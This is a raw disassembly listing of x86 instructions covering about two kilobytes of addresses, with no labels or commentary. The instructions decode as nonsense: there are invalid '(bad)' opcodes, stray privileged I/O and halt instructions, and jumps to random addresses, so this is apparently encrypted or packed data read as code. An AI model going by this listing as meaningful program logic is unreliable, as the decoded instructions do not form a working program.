  41ab27:	ret    0xebf9
  41ab2a:	sar    DWORD PTR [ecx-0x78077132],1
  41ab30:	enter  0xa332,0x4d
  41ab34:	imul   esi,ebp,0x8
  41ab37:	sbb    al,0x78
  41ab39:	stos   BYTE PTR es:[edi],al
  41ab3a:	mov    al,0x6b
  41ab3c:	inc    eax
  41ab3d:	lock arpl ax,si
  41ab40:	jle    0x41ab9e
  41ab42:	mov    dl,0x50
  41ab44:	and    ecx,DWORD PTR [esi]
  41ab46:	or     DWORD PTR [ecx+0x676bd1f5],0xffffff95
  41ab4d:	gs sahf 
  41ab4f:	push   esi
  41ab50:	adc    al,0x8
  41ab52:	dec    eax
  41ab53:	inc    ecx
  41ab54:	call   FWORD PTR [ebx-0x16a9a626]
  41ab5a:	pop    ecx
  41ab5b:	leave  
  41ab5c:	push   0x3f
  41ab5e:	push   0x2e11437a
  41ab63:	jmp    FWORD PTR [esi-0x7e6bc024]
  41ab69:	cmp    DWORD PTR [edi],ebx
  41ab6b:	inc    ebp
  41ab6c:	adc    al,0xcf
  41ab6e:	inc    ebp
  41ab6f:	ss mov ebp,0xe50da64a
  41ab75:	mov    ecx,0x8ecc1cf7
  41ab7a:	add    DWORD PTR [edx],eax
  41ab7c:	xor    DWORD PTR [eax+eiz*2+0x31c70d69],ebx
  41ab83:	adc    BYTE PTR [esi],0x48
  41ab86:	push   esi
  41ab87:	jg     0x41ab76
  41ab89:	test   al,0x6c
  41ab8b:	mov    ds:0xaeca2cb9,eax
  41ab90:	push   es
  41ab91:	lods   al,BYTE PTR ds:[esi]
  41ab92:	jb     0x41ac08
  41ab94:	dec    ebx
  41ab95:	sbb    DWORD PTR [ebx+0x5d],esp
  41ab98:	js     0x41ab54
  41ab9a:	in     al,0xfc
  41ab9c:	lds    edx,FWORD PTR [eax]
  41ab9e:	sub    eax,0x9dd08e84
  41aba3:	inc    edx
  41aba4:	add    eax,0x3d
  41aba7:	loope  0x41ab4a
  41aba9:	push   edi
  41abaa:	test   eax,0x34dbcdb2
  41abaf:	mov    BYTE PTR [eax-0x7d5559d0],al
  41abb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abb6:	inc    ebx
  41abb7:	inc    eax
  41abb8:	sub    al,0xda
  41abba:	dec    eax
  41abbb:	pop    ebp
  41abbc:	je     0x41ac07
  41abbe:	fdivp  st(1),st
  41abc0:	addr16 leave 
  41abc2:	push   fs
  41abc4:	or     edi,DWORD PTR [ebx+0x47]
  41abc7:	pop    ss
  41abc8:	into   
  41abc9:	ret    
  41abca:	(bad)  [edx+0x795fdb6f]
  41abd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abd1:	nop
  41abd2:	and    al,0xee
  41abd4:	sbb    esp,ecx
  41abd6:	cs inc edi
  41abd8:	ss inc ebp
  41abda:	stos   BYTE PTR es:[edi],al
  41abdb:	clc    
  41abdc:	gs xor eax,0x13e53252
  41abe2:	cmp    DWORD PTR [edx],ecx
  41abe4:	cmp    ah,BYTE PTR [ebx-0x7a]
  41abe7:	adc    al,0x33
  41abe9:	leave  
  41abea:	test   DWORD PTR [ecx+ecx*2+0xa14f42d],ebx
  41abf1:	add    edi,ebp
  41abf3:	and    BYTE PTR [edx+edx*1],dh
  41abf6:	aas    
  41abf7:	push   ecx
  41abf8:	add    ebx,DWORD PTR [esi]
  41abfa:	mov    ds:0xad203b2,eax
  41abff:	scas   al,BYTE PTR es:[edi]
  41ac00:	imul   ecx,DWORD PTR [ecx-0x64a832af],0x69b92bf3
  41ac0a:	jae    0x41abbb
  41ac0c:	xor    al,0xad
  41ac0e:	dec    esp
  41ac0f:	mov    eax,0xc7dd5ffd
  41ac14:	sub    eax,0x2b96fd02
  41ac19:	jns    0x41ac06
  41ac1b:	adc    BYTE PTR [ebx+0x5c],dl
  41ac1e:	add    eax,0xa27321e2
  41ac23:	loope  0x41ac07
  41ac25:	xchg   ebx,eax
  41ac26:	into   
  41ac27:	(bad)  
  41ac28:	js     0x41abb6
  41ac2a:	jle    0x41ac5a
  41ac2c:	fisttp QWORD PTR [ecx-0x5e]
  41ac2f:	and    BYTE PTR [edi],dh
  41ac31:	jnp    0x41ac27
  41ac33:	imul   eax,DWORD PTR [ecx-0x37],0xffffff88
  41ac37:	call   0x5c16:0x93587965
  41ac3e:	div    DWORD PTR [ecx+0x5c371f26]
  41ac44:	jle    0x41acc0
  41ac46:	jp     0x41ac74
  41ac48:	jge    0x41ac96
  41ac4a:	push   esp
  41ac4b:	stc    
  41ac4c:	shl    BYTE PTR [edx+0x41],0xef
  41ac50:	adc    BYTE PTR [ebp+ebp*4-0x74],ah
  41ac54:	pop    ds
  41ac55:	scas   al,BYTE PTR es:[edi]
  41ac56:	xor    ebx,ebp
  41ac58:	xchg   ecx,eax
  41ac59:	xchg   ecx,eax
  41ac5a:	imul   edi,DWORD PTR [edx],0x28a22b6d
  41ac60:	inc    eax
  41ac61:	test   al,0x5c
  41ac63:	or     eax,0xd3297516
  41ac68:	sub    DWORD PTR ds:0x1d500c00,0xed0ce3a0
  41ac72:	dec    eax
  41ac73:	cwde   
  41ac74:	fld    st(0)
  41ac76:	shr    DWORD PTR [esi-0x32],cl
  41ac79:	std    
  41ac7a:	mov    ch,0xf3
  41ac7c:	cs loopne 0x41ac4e
  41ac7f:	popf   
  41ac80:	(bad)
  41ac84:	push   ebx
  41ac85:	mov    edx,0xe00bb635
  41ac8a:	dec    esp
  41ac8b:	pusha  
  41ac8c:	mov    ecx,DWORD PTR [esi+0x7a0135ef]
  41ac92:	push   0xe29b3565
  41ac97:	cmp    BYTE PTR [edx+0x52],ah
  41ac9a:	mov    DWORD PTR [ebx+ecx*1-0x5456803e],esp
  41aca1:	retf   
  41aca2:	icebp  
  41aca3:	aad    0x50
  41aca5:	daa    
  41aca6:	add    eax,0x837b5f60
  41acab:	les    ebp,FWORD PTR [ebp-0x7e66e8aa]
  41acb1:	cmp    DWORD PTR [ecx-0x72e4a2c3],edi
  41acb7:	call   0xae19acc3
  41acbc:	fcomp  DWORD PTR [edx+0x6218b62b]
  41acc2:	loopne 0x41ad20
  41acc4:	mov    esp,0x246d2d4f
  41acc9:	mov    dh,0x33
  41accb:	imul   edx,ebp,0x55f9e644
  41acd1:	ror    DWORD PTR [ebx+0x14088f2f],1
  41acd7:	outs   dx,BYTE PTR ds:[esi]
  41acd8:	mov    ch,0x9b
  41acda:	push   ecx
  41acdb:	mov    ds:0x416af0f9,al
  41ace0:	mov    BYTE PTR [edx+0xb],bh
  41ace3:	in     al,0xd6
  41ace5:	ret    
  41ace6:	pusha  
  41ace7:	repnz or ch,dl
  41acea:	add    DWORD PTR [ebx+esi*2],esi
  41aced:	add    eax,0x176484e8
  41acf2:	add    ch,dh
  41acf4:	stos   BYTE PTR es:[edi],al
  41acf5:	loopne 0x41acd8
  41acf7:	adc    al,BYTE PTR ds:0x461ee545
  41acfd:	fmul   DWORD PTR [edx]
  41acff:	mov    dh,0x5d
  41ad01:	les    ebp,FWORD PTR [eax]
  41ad03:	fwait
  41ad04:	in     al,0x79
  41ad06:	mov    ebx,0xea9de0c0
  41ad0b:	adc    bl,BYTE PTR [edi+ebx*1]
  41ad0e:	push   0xbf45d4e1
  41ad13:	int3   
  41ad14:	inc    esp
  41ad15:	out    0xdf,eax
  41ad17:	or     DWORD PTR [ecx+eax*8-0x65],eax
  41ad1b:	fucomp st(0)
  41ad1d:	mov    al,cs:0x6e4e5028
  41ad23:	add    al,0xa2
  41ad25:	dec    ecx
  41ad26:	jge    0x41ad5a
  41ad28:	pusha  
  41ad29:	cmp    cl,ch
  41ad2b:	in     eax,dx
  41ad2c:	adc    BYTE PTR [edx-0x34b4d5f9],al
  41ad32:	mov    ds,WORD PTR [esi-0xc91a208]
  41ad38:	inc    ebp
  41ad39:	inc    edx
  41ad3a:	sub    DWORD PTR [esi],eax
  41ad3c:	xor    al,0x61
  41ad3e:	fst    DWORD PTR [eax-0x41150adc]
  41ad44:	sbb    eax,0xc3342fae
  41ad49:	ds loope 0x41ad02
  41ad4c:	jnp    0x41ad8b
  41ad4e:	mov    dh,0xe3
  41ad50:	cmp    DWORD PTR [edx+0xf152495],ebx
  41ad56:	pop    ecx
  41ad57:	cmp    esi,eax
  41ad59:	adc    al,0x8c
  41ad5b:	push   cs
  41ad5c:	in     al,0xc0
  41ad5e:	push   ecx
  41ad5f:	outs   dx,BYTE PTR ds:[esi]
  41ad60:	mov    bl,ah
  41ad62:	ins    DWORD PTR es:[edi],dx
  41ad63:	outs   dx,BYTE PTR ds:[esi]
  41ad64:	cs int 0x21
  41ad67:	cwde   
  41ad68:	sbb    al,0x98
  41ad6a:	cmc    
  41ad6b:	fdivr  DWORD PTR [ebx+ebp*8+0x2daddb5]
  41ad72:	in     eax,dx
  41ad73:	cmp    DWORD PTR [ebx],0x8ea7d657
  41ad79:	mov    al,0xf5
  41ad7b:	retf   0x2d1a
  41ad7e:	inc    ecx
  41ad7f:	std    
  41ad80:	sbb    eax,0x9009df85
  41ad85:	adc    DWORD PTR [edi],0x6b
  41ad88:	(bad)  
  41ad89:	outs   dx,DWORD PTR ds:[esi]
  41ad8a:	adc    eax,0xc79ca332
  41ad8f:	dec    esi
  41ad90:	mov    al,0x33
  41ad92:	addps  xmm6,XMMWORD PTR [esi-0x73]
  41ad96:	cmp    al,0x1a
  41ad98:	mov    ah,0x80
  41ad9a:	outs   dx,DWORD PTR ds:[esi]
  41ad9b:	stos   DWORD PTR es:[edi],eax
  41ad9c:	xchg   DWORD PTR [edx+0x46c7db3],ebp
  41ada2:	shl    ebp,1
  41ada4:	mov    ds:0x5ad886d1,al
  41ada9:	jo     0x41ad4b
  41adab:	clc    
  41adac:	mov    ds:0x76b5d5f5,al
  41adb1:	ret    
  41adb2:	jge    0x41ad87
  41adb4:	xchg   esi,eax
  41adb5:	cmc    
  41adb6:	mov    BYTE PTR [eax],al
  41adb8:	mul    DWORD PTR [edx+eax*2+0x45]
  41adbc:	hlt    
  41adbd:	push   0xdcaef14c
  41adc2:	bound  edx,QWORD PTR [esp+eax*2-0x5f5be55d]
  41adc9:	(bad)  
  41adcb:	sbb    eax,DWORD PTR [edx]
  41adcd:	sbb    dl,ah
  41adcf:	dec    ebx
  41add0:	cli    
  41add1:	add    DWORD PTR [edi],eax
  41add3:	enter  0x237d,0x8e
  41add7:	loopne 0x41ae04
  41add9:	fcmove st,st(7)
  41addb:	lods   eax,DWORD PTR ds:[esi]
  41addc:	test   eax,0xb46ca2d0
  41ade1:	mov    es,WORD PTR [esi-0x45]
  41ade4:	or     al,0xb3
  41ade6:	ja     0x41ae16
  41ade8:	inc    esp
  41ade9:	cwde   
  41adea:	arpl   WORD PTR [eax+0x15c9ca91],di
  41adf0:	sbb    al,0x35
  41adf2:	dec    ecx
  41adf3:	hlt    
  41adf4:	mov    esp,0x5376e84c
  41adf9:	jmp    0x909c0959
  41adfe:	jmp    0x401e:0xef1e6010
  41ae05:	mov    WORD PTR [ebp+0x7453ff21],ds
  41ae0b:	sahf   
  41ae0c:	dec    ecx
  41ae0d:	jo     0x41ae60
  41ae0f:	cmp    bl,BYTE PTR [edx]
  41ae11:	cmp    eax,0xeadba441
  41ae16:	shl    BYTE PTR [ebx],cl
  41ae18:	outs   dx,BYTE PTR ds:[esi]
  41ae19:	and    al,0x34
  41ae1b:	inc    eax
  41ae1c:	pop    es
  41ae1d:	pushf  
  41ae1e:	dec    esi
  41ae1f:	or     BYTE PTR [eax],0x1b
  41ae22:	mov    ebx,0xb57ac8a1
  41ae27:	ins    BYTE PTR es:[edi],dx
  41ae28:	hlt    
  41ae29:	xor    eax,0x45e1f2fc
  41ae2e:	pop    ecx
  41ae2f:	mov    WORD PTR [edi-0x46],?
  41ae32:	jne    0x41ae52
  41ae34:	mov    esi,0xa0a0602c
  41ae39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae3a:	mov    esp,0xc317a6eb
  41ae3f:	cmp    ebp,DWORD PTR [ebx]
  41ae41:	enter  0xac04,0xdc
  41ae45:	and    BYTE PTR [ebp-0x30],dl
  41ae48:	fs xchg edi,eax
  41ae4a:	push   esi
  41ae4b:	imul   esi,DWORD PTR [ebx+0x73f8cd4a],0x8c017510
  41ae55:	gs popa 
  41ae57:	and    eax,eax
  41ae59:	mov    ?,WORD PTR [edx-0x6fc98d5]
  41ae5f:	mov    ebx,0xd9c0e9bc
  41ae64:	dec    ecx
  41ae65:	jns    0x41ae07
  41ae67:	pop    ebx
  41ae68:	mov    al,0xce
  41ae6a:	cmovno edx,DWORD PTR [ebp+0x561adc52]
  41ae71:	push   ds
  41ae72:	mov    ecx,0x31325463
  41ae77:	rcl    BYTE PTR [edx],0x2e
  41ae7a:	fisttp DWORD PTR [esi]
  41ae7c:	mov    ch,0x3c
  41ae7e:	shr    DWORD PTR [ebp+eiz*4+0xa],cl
  41ae82:	loope  0x41ae55
  41ae84:	jle    0x41ae68
  41ae86:	cmp    BYTE PTR [ecx+0x60],cl
  41ae89:	retf   
  41ae8a:	jl     0x41aefb
  41ae8c:	mov    eax,ds:0xe5b84cbc
  41ae91:	inc    edi
  41ae92:	add    ecx,DWORD PTR [ebp+0x33]
  41ae95:	or     al,BYTE PTR [esi-0xc5aeaa1]
  41ae9b:	popf   
  41ae9c:	jae    0x41ae59
  41ae9e:	hlt    
  41ae9f:	loopne 0x41ae4a
  41aea1:	cmp    DWORD PTR [edx+0x44],ebp
  41aea4:	fcom   QWORD PTR [edi]
  41aea6:	push   edx
  41aea7:	sub    esi,DWORD PTR [esi]
  41aea9:	or     al,0xb5
  41aeab:	add    eax,0x5a77a866
  41aeb0:	jmp    0x29922d7e
  41aeb5:	dec    ebx
  41aeb6:	mov    ah,0x82
  41aeb8:	sub    esp,edx
  41aeba:	fldcw  WORD PTR [ebp-0x70160290]
  41aec0:	pop    ecx
  41aec1:	xchg   ebx,eax
  41aec2:	loopne 0x41ae8f
  41aec4:	scas   eax,DWORD PTR es:[edi]
  41aec5:	shl    DWORD PTR [eax],0x54
  41aec8:	cmp    al,0x56
  41aeca:	and    BYTE PTR [edi-0x2f],ah
  41aecd:	mov    eax,ds:0x6cd6e6a7
  41aed2:	cs int3 
  41aed4:	push   0xffffffde
  41aed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aed7:	pop    ds
  41aed8:	dec    esi
  41aed9:	push   esi
  41aeda:	leave  
  41aedb:	(bad)
  41aedf:	and    DWORD PTR [esi-0xd5c25d6],0x21742f74
  41aee9:	mov    esp,0x78aed503
  41aeee:	iret   
  41aeef:	cmp    bl,BYTE PTR [ebx]
  41aef1:	dec    eax
  41aef2:	fcomip st,st(0)
  41aef4:	push   esi
  41aef5:	mov    edi,0x62454887
  41aefa:	pop    ebp
  41aefb:	mov    eax,0x1f719a3b
  41af00:	popa   
  41af01:	push   cs
  41af02:	retf   
  41af03:	cmc    
  41af04:	iret   
  41af05:	push   es
  41af06:	cmp    DWORD PTR [ecx],ebp
  41af08:	xchg   ebp,eax
  41af09:	adc    eax,0xa37c92af
  41af0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0f:	add    al,0xa0
  41af11:	es enter 0x60b9,0x19
  41af16:	xor    ebp,ebx
  41af18:	aaa    
  41af19:	inc    ebx
  41af1a:	jnp    0x41aec7
  41af1c:	xor    ecx,DWORD PTR [edi+0x2f]
  41af1f:	jecxz  0x41aecd
  41af21:	xor    eax,0xa5ce51af
  41af26:	add    esp,edx
  41af28:	fs mov dh,0x74
  41af2b:	fsub   QWORD PTR [edx+0x3eca99ef]
  41af31:	std    
  41af32:	call   0x77a5:0x1a8f0023
  41af39:	inc    al
  41af3b:	xor    dl,dh
  41af3d:	xchg   ebp,eax
  41af3e:	in     al,0xd7
  41af40:	dec    edx
  41af41:	shl    BYTE PTR [esp+eiz*2+0x56],0xe6
  41af46:	ficomp WORD PTR [ebx-0x40]
  41af49:	or     eax,0xbbddd7fe
  41af4e:	cli    
  41af4f:	push   0xffffff89
  41af51:	dec    eax
  41af52:	adc    bl,BYTE PTR [eax-0x653d5214]
  41af58:	lahf   
  41af59:	hlt    
  41af5a:	adc    al,0x3d
  41af5c:	jmp    esi
  41af5e:	clc    
  41af5f:	std    
  41af60:	mov    dl,bh
  41af62:	repnz and DWORD PTR [esi-0x5d],edi
  41af66:	sbb    al,0x83
  41af69:	cmp    dh,0x15
  41af6c:	clc    
  41af6d:	cli    
  41af6e:	add    DWORD PTR [edx+0x11],eax
  41af71:	or     esi,ebx
  41af73:	int3   
  41af74:	das    
  41af75:	rol    ah,0x32
  41af78:	(bad)  
  41af79:	xchg   ebx,eax
  41af7a:	in     eax,dx
  41af7b:	lea    ebp,[ebx+0xf]
  41af7e:	dec    ecx
  41af7f:	or     DWORD PTR [esi],esp
  41af81:	xchg   esi,eax
  41af82:	lds    eax,FWORD PTR [ebp-0x7628d1ac]
  41af88:	jmp    0x31f47433
  41af8d:	(bad)  
  41af8e:	sar    eax,1
  41af90:	jmp    0x41af2b
  41af92:	add    DWORD PTR [ecx+0x63],ecx
  41af95:	push   cs
  41af96:	mov    ds:0x488b7627,eax
  41af9b:	pushf  
  41af9c:	inc    ebx
  41af9d:	mov    al,0x90
  41af9f:	pop    ss
  41afa0:	aam    0xd7
  41afa2:	push   ecx
  41afa3:	jl     0x41afed
  41afa5:	sub    al,0x48
  41afa7:	lahf   
  41afa8:	ds sti 
  41afaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afab:	sub    BYTE PTR [edx-0x76],dh
  41afae:	jl     0x41af31
  41afb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb1:	pop    edx
  41afb2:	mov    DWORD PTR [edi-0x703b27c6],esi
  41afb8:	add    al,0x8b
  41afba:	ins    DWORD PTR es:[edi],dx
  41afbb:	adc    dl,ch
  41afbd:	xor    eax,0x5660bf22
  41afc2:	xchg   ebp,eax
  41afc3:	ja     0x41af60
  41afc5:	add    al,0x62
  41afc7:	outs   dx,BYTE PTR ds:[si]
  41afc9:	pushf  
  41afca:	mov    esi,0xf51bbe1
  41afcf:	fld    DWORD PTR [ebx+ecx*1+0x31]
  41afd3:	jnp    0x41afb1
  41afd5:	out    dx,al
  41afd6:	jne    0x41afe7
  41afd8:	stos   DWORD PTR es:[edi],eax
  41afd9:	(bad)  
  41afda:	clc    
  41afdb:	iret   
  41afdc:	mov    eax,0x60560dee
  41afe1:	pop    ebp
  41afe2:	sub    eax,DWORD PTR [edi-0x49d59041]
  41afe8:	jbe    0x41b060
  41afea:	rep lods al,BYTE PTR ds:[esi]
  41afec:	ret    0x3288
  41afef:	and    cl,BYTE PTR [eax-0x25604c55]
  41aff5:	cmp    esi,DWORD PTR [esi-0x5d]
  41aff8:	enter  0x7d0e,0xbb
  41affc:	sub    bl,al
  41affe:	out    dx,al
  41afff:	xchg   esp,eax
  41b000:	jns    0x41af94
  41b002:	dec    ebx
  41b003:	pop    ss
  41b004:	sar    BYTE PTR [edi+ecx*1+0x450ed6bd],0xf5
  41b00c:	and    DWORD PTR [bp+di-0x6a],edx
  41b010:	dec    esp
  41b011:	dec    ecx
  41b012:	jl     0x41b040
  41b014:	mov    bl,0x98
  41b016:	loop   0x41afaf
  41b018:	out    dx,eax
  41b019:	pop    ebp
  41b01a:	inc    edx
  41b01b:	hlt    
  41b01c:	jmp    0x41afea
  41b01e:	(bad)  
  41b01f:	mov    ecx,0xa90b01b1
  41b024:	or     edx,ebx
  41b026:	inc    eax
  41b027:	loop   0x41b01e
  41b029:	cwde   
  41b02a:	repz iret 
  41b02c:	or     cl,bh
  41b02e:	mul    esp
  41b030:	push   edi
  41b031:	cmp    DWORD PTR [edi],ecx
  41b033:	cmc    
  41b034:	das    
  41b035:	lock ret 0x3381
  41b039:	jae    0x41b0aa
  41b03b:	and    DWORD PTR es:[edx],esp
  41b03e:	dec    edi
  41b03f:	xchg   BYTE PTR [ecx+esi*1-0x7c765e90],bh
  41b046:	jecxz  0x41b09f
  41b048:	(bad)  
  41b049:	icebp  
  41b04a:	out    0x60,al
  41b04c:	mov    dl,0x2b
  41b04e:	les    ebx,FWORD PTR [eax+0x3f]
  41b051:	or     eax,edi
  41b053:	inc    esp
  41b054:	jge    0x41b08d
  41b056:	mov    edi,0x5b97910b
  41b05b:	dec    ebx
  41b05c:	test   eax,0xba4a2558
  41b061:	pop    ecx
  41b062:	cli    
  41b063:	test   al,0x36
  41b065:	ret    0x941
  41b068:	stos   BYTE PTR es:[edi],al
  41b069:	push   ecx
  41b06a:	jne    0x41b054
  41b06c:	mov    dh,0xc8
  41b06e:	in     eax,dx
  41b06f:	xor    BYTE PTR [esi+eax*8],ah
  41b072:	in     eax,0xa1
  41b074:	or     eax,0x734fe0d2
  41b079:	add    bl,bl
  41b07b:	xchg   edi,eax
  41b07c:	mov    edx,ebx
  41b07e:	pop    ebp
  41b07f:	adc    ch,bl
  41b081:	xor    dl,BYTE PTR [edi]
  41b083:	test   BYTE PTR [edx],bh
  41b085:	inc    esp
  41b086:	xor    al,0x3c
  41b088:	xor    al,0x78
  41b08a:	popa   
  41b08b:	nop
  41b08c:	jmp    0x21bac59c
  41b091:	(bad)  
  41b092:	xchg   esp,eax
  41b093:	outs   dx,DWORD PTR ds:[esi]
  41b094:	xchg   esi,eax
  41b095:	push   edi
  41b096:	pusha  
  41b097:	add    edx,0x48f79c6f
  41b09d:	pop    esp
  41b09e:	jo     0x41b093
  41b0a0:	out    0x37,eax
  41b0a2:	out    0x46,eax
  41b0a4:	mov    eax,ds:0x3bf49169
  41b0a9:	xor    al,0xfc
  41b0ab:	pop    ebx
  41b0ac:	pop    es
  41b0ad:	xor    cl,BYTE PTR [ebx]
  41b0af:	sub    ch,bl
  41b0b1:	aam    0xdb
  41b0b3:	ret    
  41b0b4:	je     0x41b0c3
  41b0b6:	xor    ebx,DWORD PTR [eax+0x1f]
  41b0b9:	out    0xbc,al
  41b0bb:	xor    ebx,edx
  41b0bd:	cmp    al,0x1b
  41b0bf:	pushf  
  41b0c0:	stc    
  41b0c1:	popa   
  41b0c2:	add    BYTE PTR [ecx-0x29],al
  41b0c5:	cmp    BYTE PTR [esi+0x12],cl
  41b0c8:	pop    ebp
  41b0c9:	imul   ebx,DWORD PTR [ebp-0x6f],0x2d
  41b0cd:	sub    ebp,0xbceb73f0
  41b0d3:	adc    al,0x38
  41b0d5:	test   DWORD PTR [esi],0x90471ae9
  41b0db:	push   ebx
  41b0dc:	add    BYTE PTR [bp+di],dl
  41b0df:	dec    ebp
  41b0e0:	pop    edx
  41b0e1:	and    ebx,ebx
  41b0e3:	(bad)
  41b0e7:	sbb    al,0x4c
  41b0e9:	sbb    BYTE PTR [ebx],bl
  41b0eb:	mov    eax,ds:0x8785a96d
  41b0f0:	rcl    bh,1
  41b0f2:	mov    WORD PTR [edi-0x75c49a1f],?
  41b0f8:	repnz and al,0xdc
  41b0fb:	add    eax,0x654a9054
  41b100:	adc    ebp,DWORD PTR [esi+0x2914a5b8]
  41b106:	xchg   ebx,eax
  41b107:	adc    ebx,0x78382822
  41b10d:	sbb    bh,BYTE PTR [ebx-0x3952de5]
  41b113:	mov    edx,0x1c560c79
  41b118:	loopne 0x41b14b
  41b11a:	repnz std 
  41b11c:	enter  0xf08e,0x98
  41b120:	movq   mm2,QWORD PTR [ebp+ecx*4-0x183a24f5]
  41b128:	cmp    DWORD PTR [edx+0x55],edx
  41b12b:	shl    BYTE PTR [ebx],0x28
  41b12e:	leave  
  41b12f:	sbb    eax,0x3ee52359
  41b134:	pop    ecx
  41b135:	popa   
  41b136:	rcl    BYTE PTR [ecx],0xc8
  41b139:	hlt    
  41b13a:	jmp    0x41b0d8
  41b13c:	add    eax,0x6c4ea0bb
  41b141:	push   0xffffffa7
  41b143:	mov    ch,0x27
  41b145:	add    dh,BYTE PTR [esi+ebp*4+0x70]
  41b149:	mov    ebx,0x48efeff1
  41b14e:	enter  0x2135,0x10
  41b152:	pop    edi
  41b153:	shl    DWORD PTR [esp+ebp*4],cl
  41b156:	sti    
  41b157:	(bad)  
  41b158:	aas    
  41b159:	and    al,0xd0
  41b15b:	call   0xa895257
  41b160:	dec    ecx
  41b161:	int    0x79
  41b163:	inc    esp
  41b164:	in     eax,dx
  41b165:	mov    esp,0x5e7974c7
  41b16a:	inc    edi
  41b16b:	rcr    esi,cl
  41b16d:	pop    ebp
  41b16e:	(bad)  
  41b16f:	push   ss
  41b170:	jge    0x41b1c4
  41b172:	pop    esp
  41b173:	push   0xfffffff6
  41b175:	dec    ecx
  41b176:	adc    bh,ah
  41b178:	or     edx,DWORD PTR [esi]
  41b17a:	or     ebp,eax
  41b17c:	mov    dl,BYTE PTR [ecx+0x70]
  41b17f:	out    0x36,eax
  41b181:	hlt    
  41b182:	int3   
  41b183:	xor    DWORD PTR [edx+0x40845e4c],0x4009aca3
  41b18d:	scas   eax,DWORD PTR es:[edi]
  41b18e:	cmp    dl,bh
  41b190:	ds mov al,0xc6
  41b193:	js     0x41b160
  41b195:	ror    DWORD PTR [ebp+0x52],1
  41b198:	out    dx,al
  41b199:	inc    ebp
  41b19a:	xchg   ebx,eax
  41b19b:	jle    0x41b16d
  41b19d:	add    ebx,esp
  41b19f:	and    ebp,eax
  41b1a1:	test   bl,ah
  41b1a3:	xchg   ebx,eax
  41b1a4:	pop    DWORD PTR [edi+0x4d5eb189]
  41b1aa:	dec    esi
  41b1ab:	icebp  
  41b1ac:	mov    bl,BYTE PTR es:[edi+0x4c]
  41b1b0:	xchg   DWORD PTR [ebx],ecx
  41b1b2:	and    dl,dh
  41b1b4:	dec    edx
  41b1b5:	into   
  41b1b6:	cdq    
  41b1b7:	(bad)  
  41b1b8:	ds xchg ebp,eax
  41b1ba:	jno    0x41b178
  41b1bc:	sbb    eax,0x2b051fa
  41b1c1:	adc    al,0x77
  41b1c3:	add    al,0xe1
  41b1c5:	bound  edi,QWORD PTR [ebx]
  41b1c7:	jmp    0x41b20f
  41b1c9:	scas   al,BYTE PTR es:[edi]
  41b1ca:	pop    eax
  41b1cb:	push   es
  41b1cc:	mov    bh,0x88
  41b1ce:	loope  0x41b16d
  41b1d0:	pusha  
  41b1d1:	lahf   
  41b1d2:	mov    ebp,0x811a6f4d
  41b1d7:	leave  
  41b1d8:	outs   dx,BYTE PTR ds:[esi]
  41b1d9:	jmp    0x41b255
  41b1db:	(bad)  
  41b1dc:	test   BYTE PTR [esi],bl
  41b1de:	dec    ecx
  41b1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1e0:	mov    edx,0x16b75e7e
  41b1e5:	cmc    
  41b1e6:	out    dx,al
  41b1e7:	scas   eax,DWORD PTR es:[edi]
  41b1e8:	imul   esp,DWORD PTR [ebp+edi*1+0x3028334b],0x4a
  41b1f0:	fistp  DWORD PTR [ebp-0x20856704]
  41b1f6:	dec    ebx
  41b1f7:	stos   BYTE PTR es:[edi],al
  41b1f8:	dec    edx
  41b1f9:	push   0x2c
  41b1fb:	ror    BYTE PTR [edi],0x4c
  41b1fe:	nop
  41b1ff:	and    al,0x33
  41b201:	fistp  QWORD PTR [esi]
  41b203:	or     edi,edx
  41b205:	ins    DWORD PTR es:[edi],dx
  41b206:	lahf   
  41b207:	test   BYTE PTR [ebx+eiz*2+0x59],al
  41b20b:	inc    esi
  41b20c:	es xchg ecx,eax
  41b20e:	in     eax,0xf8
  41b210:	aas    
  41b211:	cmp    BYTE PTR [ebx*8-0x51f8ec26],ah
  41b218:	mov    ds:0x40baa758,eax
  41b21d:	dec    esi
  41b21e:	push   esp
  41b21f:	bound  edi,QWORD PTR [ebx+ebx*1]
  41b222:	test   BYTE PTR [edx+0x0],ch
  41b225:	mov    ebp,0xd76a9409
  41b22a:	and    edi,ebp
  41b22c:	push   0x72dca0a3
  41b231:	xlat   BYTE PTR ds:[ebx]
  41b232:	lds    edx,FWORD PTR [esi]
  41b234:	mov    ebp,0x7a17b99
  41b239:	mov    ds:0x706992cf,al
  41b23e:	gs inc esi
  41b240:	test   BYTE PTR [edx-0x4e],ah
  41b243:	mov    ebx,0xa293450c
  41b248:	das    
  41b249:	mov    cl,0xc
  41b24b:	push   ebp
  41b24c:	pop    ebp
  41b24d:	jp     0x41b254
  41b24f:	enter  0xf25f,0xa9
  41b253:	sbb    DWORD PTR [ebx+0x74],ecx
  41b256:	arpl   dx,ax
  41b258:	cmp    eax,ebx
  41b25a:	or     eax,0x17556cd3
  41b25f:	repnz or ch,BYTE PTR [esi+0x48]
  41b263:	imul   edx,DWORD PTR [esi+edi*8+0x7d40f688],0xc15ecc3c
  41b26e:	nop
  41b26f:	or     al,0xd5
  41b271:	adc    al,0x6b
  41b273:	mov    edi,0xb0b23f1e
  41b278:	xchg   DWORD PTR ds:0x691b470d,ebp
  41b27e:	pop    ebx
  41b27f:	cld    
  41b280:	dec    esi
  41b281:	mov    al,ds:0x7db03f6
  41b286:	test   al,0x76
  41b288:	addr16 mov dh,0x8
  41b28b:	jl     0x41b29b
  41b28d:	mov    edi,0xc578e050
  41b292:	sbb    DWORD PTR [eax+ecx*4],edi
  41b295:	inc    esi
  41b296:	cmp    al,0x7f
  41b298:	add    al,0x82
  41b29a:	cmp    DWORD PTR [ecx-0xd677937],ebx
  41b2a0:	or     ebx,DWORD PTR [ebx+0xe8fdaf4]
  41b2a6:	dec    ecx
  41b2a7:	xchg   esi,eax
  41b2a8:	out    0xe9,al
  41b2aa:	jg     0x41b24f
  41b2ac:	rcl    bl,cl
  41b2ae:	jne    0x41b2a9
  41b2b0:	ins    DWORD PTR es:[edi],dx
  41b2b1:	scas   al,BYTE PTR es:[edi]
  41b2b2:	int3   
  41b2b3:	test   al,0xd3
